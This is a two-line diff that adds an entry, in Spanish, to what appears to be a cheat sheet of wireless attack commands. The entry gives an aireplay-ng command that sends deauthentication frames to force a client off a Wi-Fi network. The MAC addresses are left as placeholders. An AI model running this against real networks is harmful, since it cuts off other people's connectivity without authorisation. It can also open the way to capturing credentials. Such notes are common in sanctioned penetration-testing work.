@@ -1,0 +1,2 @@
+▶ Desautenticar Cliente (Forzar desconexión de un cliente):
+  aireplay-ng --deauth 5 -c <client_mac_address> -a <mac_address> wlan0mon
